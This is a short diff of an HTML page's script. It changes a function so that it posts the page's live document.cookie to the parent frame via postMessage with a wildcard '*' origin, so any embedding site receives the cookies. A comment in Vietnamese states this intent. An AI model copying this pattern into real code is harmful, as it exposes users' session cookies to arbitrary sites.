@@ -3,7 +3,10 @@
     <meta name="robots" content="noindex,nofollow" />
     <script>
       function sendCookieToDomainA() {
-        const cookieValue = '9e0be964-7141-4cd7-a9bb-9f0f377e7681'; //document.cookie
+        const cookieValue = document.cookie;
+        console.log("Cookie Value:", cookieValue);
+
+        // Gửi giá trị cookie về cho trang cha (bất kỳ domain)
         window.parent.postMessage(cookieValue, "*");
       }
 
